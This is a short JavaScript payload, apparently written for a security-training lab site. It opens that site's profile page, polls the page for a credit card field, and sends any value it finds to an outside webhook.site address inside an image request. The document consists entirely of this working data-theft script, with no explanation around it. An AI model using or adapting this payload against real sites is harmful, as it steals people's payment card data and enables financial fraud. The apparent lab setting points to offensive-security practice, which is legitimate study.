const win = window.open("https://koinbase.cyberjutsu-lab.tech/profile.php", "_blank");

const interval = setInterval(() => {
  try {
    const cc = win.document.querySelector('#credit_card')?.value;
    if (cc) {
      clearInterval(interval);
      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(cc);
    }
  } catch (e) {
    // cross-origin access error, wait and retry
  }
}, 1000);
